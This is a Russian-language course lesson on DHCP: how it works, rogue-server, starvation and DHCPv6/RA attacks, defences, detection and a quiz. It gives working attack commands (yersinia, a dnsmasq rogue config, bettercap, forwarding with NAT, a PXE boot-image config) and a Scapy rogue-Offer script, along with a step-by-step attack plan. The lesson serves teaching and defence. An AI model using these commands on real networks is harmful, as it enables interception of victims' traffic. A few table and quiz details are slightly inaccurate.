---
id: network-dhcp
title: "DHCP: устройство, rogue-сервер и атаки на конфигурацию"
category: network
parent: network-arp-deep
difficulty: medium
order: 1
tags: [network, dhcp, rogue, starvation, mitm, layer2]
prerequisites: [network-mitm, network-arp-deep]
useful_for:
  - "CTF Network (L2-конфигурация)"
  - "Пентест: захват сегмента через DHCP"
  - "Работа: защита DHCP и расследования"
estimated_minutes: 50
summary: "Как работает DHCP, чем опасны rogue-сервер и starvation-атака, как подсунуть жертве свой шлюз/DNS и как защититься."
---
DHCP автоматически выдаёт хостам IP, шлюз, DNS и другие параметры. Поскольку в классическом DHCP **нет аутентификации сервера**, атакующий может поднять свой сервер и «перенастроить» жертв на себя — это самый быстрый способ получить позицию MITM. Клиент доверяет первому пришедшему Offer, а значит исход гонки решает задержка. Урок опирается на [`network-mitm`](network-mitm) и [`network-arp-deep`](network-arp-deep).

## Как работает DHCP (DORA)

1. **Discover** — клиент broadcast: «есть DHCP-серверы?» (src 0.0.0.0:68 → dst 255.255.255.255:67).
2. **Offer** — сервер предлагает адрес.
3. **Request** — клиент запрашивает предложенный адрес.
4. **Ack** — сервер подтверждает (выдаёт lease + опции).

Ключевые опции: **3 (router)** — шлюз, **6 (DNS)**, **15 (domain)**, **51 (lease)**, **119 (domain search)**, **121 (classless routes)**, **42 (NTP)**, **252 (WPAD)**.

## Атаки

- **Rogue DHCP** — подставной сервер выдаёт свой шлюз/DNS → MITM. Самый быстрый путь к перехвату.
- **DHCP starvation** — фальшивые Discover вычерпывают пул, вынуждая брать адрес у rogue-сервера.
- **DHCP spoofing/инъекция** — подмена опций легитимного сервера.
- **Атака на lease** — короткий lease → чаще обновление → больше шансов перехватить.
- **DHCPv6/RA spoofing** — аналогично для IPv6.
- **Option 82/relay abuse** — подделка relay agent info вне доверенного порта.

## Инструменты и команды

```bash
# Rogue DHCP (yersinia)
sudo yersinia dhcp -attack 1 -interface eth0
# Или собственный сервер
# dnsmasq:  dhcp-range=10.0.0.100,10.0.0.200,12h
#           dhcp-option=3,10.0.0.99     # шлюз = атакующий
#           dhcp-option=6,10.0.0.99     # DNS = атакующий
sudo dnsmasq -C rogue.conf -d
# Starvation
yersinia dhcp -attack 2 -interface eth0
# Наблюдение
sudo tcpdump -i eth0 -n 'udp port 67 or udp port 68'
# bettercap (современный вариант)
sudo bettercap -iface eth0 -eval 'set dhcp.server 10.0.0.99; dhcp on'
```

## Разобранный пример: rogue DHCP как «мгновенный MITM»

```bash
# 1. Поднимаем rogue-сервер с нашим шлюзом/DNS
sudo dnsmasq -C rogue.conf -d &
# rogue.conf:
#   interface=eth0
#   dhcp-range=10.0.0.100,10.0.0.200,12h
#   dhcp-option=3,10.0.0.99
#   dhcp-option=6,10.0.0.99
# 2. Включаем forwarding и сниффинг
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo tcpdump -i eth0 -n -w dhcp_mitm.pcap
# 3. Жертва обновляет lease -> получает наш шлюз
# 4. Весь её трафик идёт через нас (HTTP в открытом виде, DNS-запросы)
```

Дополнительно можно добавить **NAT**, чтобы интернет у жертвы не пропадал:

```bash
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

## Защита

- **DHCP snooping** — серверные сообщения (Offer/Ack) разрешены только с **trusted**-портов.
- **DHCP snooping binding table** — основа для **Dynamic ARP Inspection**.
- **Port security** — против starvation (лимит MAC).
- **802.1X** — аутентификация портов.
- Логирование DHCP и алерты на несколько серверов в сегменте.
- **Rate-limiting** DHCP на access-портах против starvation.

## Частые ошибки

- **Забыть про опции 3/6/121** — жертва «сядет» без интернета/маршрутов.
- **Игнорировать lease** — короткий lease ускоряет захват.
- **Не включить forwarding** — трафик жертвы оборвётся.
- **Путать starvation и rogue** — одна истощает пул, другой выдаёт конфиг.
- **Не проверять несколько DHCP-серверов** — признак компрометации.
- **Забывать про IPv6** — RA/DHCPv6 тоже атакуются.
- **Не делать NAT** — без masquerade у жертвы пропадёт интернет (и это заметно).

## DHCPv6 и Router Advertisement

IPv6 использует **SLAAC** (Router Advertisement) и **DHCPv6** — отдельные механизмы с теми же проблемами:

- **Rogue RA** делает атакующего шлюзом (в т.ч. перехват DNS через RDNSS).
- **DHCPv6 spoofing** выдаёт поддельные параметры.
- Фильтры IPv4 часто не покрывают ICMPv6 → обход.

```bash
# Обнаружить RA/DHCPv6 (в лаборатории: mitm6, fake_router6)
tcpdump -i eth0 -n 'icmp6 or udp port 546 or udp port 547'
# Проверить принятую IPv6-конфигурацию
ip -6 addr; ip -6 route; cat /etc/resolv.conf
```

Защита: **RA Guard**, **DHCPv6 Guard**, фильтрация ICMPv6 на access-портах.

## Диагностика и разбор инцидента

- **Найти rogue-сервер**: в логах коммутатора — порт с DHCP-серверными сообщениями.
- **Клиентская сторона**: несколько DHCP-серверов в сегменте → `journalctl`/Event Log покажет смену шлюза.
- **PCAP**: искать `Offer`/`Ack` с неожиданного IP.
- **Смена шлюза** без объяснимой причины — признак rogue DHCP.

```bash
# Кто выдаёт адреса
sudo tcpdump -i eth0 -n -v 'udp port 67 or udp port 68'
# На клиенте — история аренды
journalctl -u NetworkManager | grep -i dhcp
```

## Сравнение с другими L2-атаками

| Атака | Уровень | Что даёт | Защита |
|-------|---------|----------|--------|
| Rogue DHCP | L7→L3 | подмена шлюза/DNS | DHCP snooping |
| ARP-спуфинг | L2 | MITM в сегменте | DAI |
| VLAN hopping | L2 | выход в чужой VLAN | отключить DTP/802.1Q |
| STP-захват | L2 | перехват топологии | BPDU/Root Guard |

Часто комбинируют: rogue DHCP → жертва получает наш шлюз → ARP уже не нужен для MITM.

## Резюме (пошаговый план атаки)

1. Проверить, разрешены ли клиентские DHCP-сообщения от хостов.
2. Поднять rogue-сервер с опциями 3/6/121.
3. Включить forwarding и сниффинг — трафик пойдёт через нас.
4. Использовать короткий lease для ускорения.
5. В отчёте — рекомендации: DHCP snooping, port security, 802.1X, RA/DHCPv6 Guard.

## DHCP-опции, которые стоит подменять

| Опция | Значение | Зачем атакующему |
|-------|----------|------------------|
| 3 | Router | стать шлюзом (MITM) |
| 6 | DNS | подменить резолвер |
| 15 | Domain name | фишинг/керберос |
| 42 | NTP | подмена времени |
| 119 | Domain search | DNS-суффиксы |
| 121 | Classless routes | добавить маршруты |
| 252 | WPAD | прокси через PAC |
| 43/60 | Vendor | атаки на конкретные ОС |

Подмена **WPAD (252)** — классика: жертва идёт за `wpad.dat` к нам и использует наш прокси.

## Захват и анализ

```bash
# Смотреть DORA в реальном времени
sudo tcpdump -i eth0 -n -vv 'udp port 67 or udp port 68'
# Кто выдал адрес (в дампе)
tshark -r dhcp.pcap -Y 'dhcp.option.dhcp==2' -T fields -e ip.src -e dhcp.option.dhcp
# Собрать выданные параметры
tshark -r dhcp.pcap -Y 'dhcp.option.dhcp==5' -T fields -e ip.dst -e dhcp.ip.your -e dhcp.option.router
```

## DHCP в корпоративной среде

- **Резервирование по MAC** — атакующий может подделать MAC известного устройства.
- **Option 82** (relay agent info) — коммутатор вставляет; подделка вне доверенного порта не пройдёт при snooping.
- **DHCP failover** между серверами — легитимно; два сервера в сегменте не всегда атака.
- **Обнаружение**: несколько `DHCPOFFER` на один `DISCOVER` — тревога.

## Что дальше / решение

Дерево решений:

1. **Нужен MITM в сегменте** → rogue DHCP с опциями 3/6/121, включить forwarding + NAT.
2. **Пул не даёт адрес / хотите форсировать** → DHCP starvation (yersinia attack 2), затем rogue.
3. **Нужно только подменить DNS** → достаточно опции 6 (+ 119/121).
4. **Есть IPv6** → проверьте RA/DHCPv6 (mitm6) — фильтры IPv4 их не покрывают.
5. **Разбор инцидента** → PCAP: искать Offer/Ack с чужого IP; на коммутаторе — порт с серверными сообщениями.

Решение-эвристика: rogue DHCP быстрее и «чище» ARP-спуфинга, потому что жертва сама себя настраивает; но требует, чтобы клиент обновил lease (или starvation для форсирования).

## Резюме

Rogue DHCP — быстрый путь к MITM: жертва сама настраивается на наш шлюз/DNS. Защита строится на DHCP snooping + DAI + port security + 802.1X. Не забывайте про IPv6 (RA/DHCPv6).

## PXE и TFTP: DHCP как точка доставки

Опции **66 (TFTP server)** и **67 (bootfile name)** превращают DHCP в стартовую точку **PXE-загрузки**. Атакующий, поднявший rogue DHCP, может указать жертве на свой TFTP и отдать поддельный загрузчик/образ — классический вектор для лабораторий и «злых горничных». Для этого в rogue-конфиге добавляют:

```
dhcp-boot=pxelinux.0,attacker,10.0.0.99
dhcp-option=66,10.0.0.99
```

Затем поднимают TFTP (`tftpd-hpa`) и раздают полезную нагрузку. В CTF это встречается как «получи образ по PXE и вытащи секрет».

## DHCP relay и Option 82

В больших сетях DHCP-сервер стоит не в каждом сегменте, а в центре — запросы к нему передаёт **relay agent** (часто сам коммутатор/роутер). Relay вставляет **Option 82** (circuit-id/remote-id) с информацией о порте. Атакующий вне доверенного порта не может подделать валидный Option 82, поэтому при **DHCP snooping** такие пакеты отбрасываются. В дампе смотрите:

```bash
tshark -r dhcp.pcap -Y 'dhcp.option.relay_agent_information' -V | head -40
```

## Сравнение инструментов rogue-сервера

| Инструмент | Плюсы | Минусы |
|------------|-------|--------|
| dnsmasq | полноценный сервер, DNS+TFTP, конфиг | нужен свой конфиг |
| yersinia | готовые атаки (rogue/starvation) | только L2, без DNS |
| bettercap | модульно, современный | зависимость от ruby-экосистемы |
| Scapy | полный контроль над пакетом | надо писать логику вручную |

```python
# Минимальный rogue Offer на Scapy (только для лаборатории)
from scapy.all import *
def dhcp_offer(p):
    if p[DHCP] and p[DHCP].options[0][1] == 1:  # Discover
        offer = (Ether()/IP(src="10.0.0.99",dst="255.255.255.255")/
                 UDP(sport=67,dport=68)/
                 BOOTP(op=2,yiaddr="10.0.0.150",siaddr="10.0.0.99")/
                 DHCP(options=[("message-type","offer"),
                               ("router","10.0.0.99"),("name-server","10.0.0.99"),
                               ("server_id","10.0.0.99"),"end"]))
        sendp(offer, iface="eth0")
sniff(filter="udp port 67", prn=dhcp_offer, iface="eth0")
```

## Проверка своей сети на rogue DHCP

```bash
# Прослушать сегмент и найти все серверные ответы
sudo tcpdump -i eth0 -n -v 'udp port 67' | grep -i offer
# Или DHCP-сканером
nmap --script broadcast-dhcp-discover -e eth0
```

Если на один `DISCOVER` приходит больше одного `OFFER` — в сегменте лишний сервер.

## Квиз

```quiz
- question: "Какую опцию DHCP подменяет атакующий, чтобы стать шлюзом жертвы?"
  options:
    - "Опцию 3 (router)"
    - "Опцию 51 (lease time)"
    - "Опцию 53 (message type)"
    - "Опцию 1 (subnet mask)"
  answer: 0
  explanation: "Опция router (3) задаёт шлюз по умолчанию — ключ к перенаправлению трафика."
- question: "Что делает DHCP starvation?"
  options:
    - "Шифрует DHCP"
    - "Вычерпывает пул адресов фальшивыми Discover, вынуждая брать адрес у rogue-сервера"
    - "Подделывает ARP"
    - "Отключает DNS"
  answer: 1
  explanation: "Истощив пул, атакующий делает единственным источником адресов свой сервер."
- question: "Почему клиент может принять конфигурацию rogue-сервера?"
  options:
    - "DHCP аутентифицирован"
    - "Клиент обычно берёт первый пришедший Offer без проверки источника"
    - "Rogue-сервер подписан"
    - "DHCP работает на L3"
  answer: 1
  explanation: "В классическом DHCP нет аутентификации сервера; побеждает первый ответ."
- question: "Какая функция коммутатора защищает от rogue DHCP?"
  options:
    - "DHCP snooping"
    - "STP"
    - "NAT"
    - "QoS"
  answer: 0
  explanation: "DHCP snooping разрешает серверные сообщения только с trusted-портов."
- question: "С какой атакой связывают DHCP snooping binding table?"
  options:
    - "Dynamic ARP Inspection"
    - "TLS downgrade"
    - "DNS tunneling"
    - "BGP hijack"
  answer: 0
  explanation: "DAI проверяет ARP по таблице, которую наполняет DHCP snooping."
```

## Где пригодится

- **CTF:** задачи на L2-конфигурацию и перехват.
- **Пентест:** быстрый захват сегмента через rogue DHCP.
- **Работа:** защита DHCP (snooping, port security).
- **SOC:** детект rogue-серверов и starvation.
- **Основы:** понимание, как хост получает сетевую конфигурацию.
